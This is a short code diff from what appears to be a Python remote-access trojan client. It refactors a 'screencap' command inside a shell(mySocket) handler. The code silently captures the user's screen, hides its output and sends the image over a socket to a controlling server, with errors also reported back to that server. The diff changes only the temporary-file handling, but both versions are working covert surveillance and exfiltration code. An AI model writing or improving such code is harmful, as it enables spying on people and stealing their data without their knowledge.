@@ -85,14 +85,13 @@ def shell(mySocket):
 
         elif 'screencap' == commandList[0]:
             try:
-                tempPath = tempfile.mkdtemp()
-                fileName = 'img.jpg'
-                fullPath = os.path.join(tempPath, fileName)
-
-                ImageGrab.grab().save(fullPath, "JPEG")
-                with HiddenPrints():
-                    sendFile(mySocket, fullPath)
-                shutil.rmtree(tempPath)
+                # https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.Image.save
+                # https://docs.python.org/3/library/tempfile.html
+                with tempfile.NamedTemporaryFile(delete_on_close=False) as temporaryFile:
+                    ImageGrab.grab().save(temporaryFile, "JPEG")  # Accepts file/stream object.
+                    temporaryFile.close()  # Closed because sendFile() opens the file again.
+                    with HiddenPrints():
+                        sendFile(mySocket, temporaryFile.name)
             except Exception as e:
                 mySocket.send('ERROR'.encode())
                 informToServer = "[+] Some error occured. " + str(e)
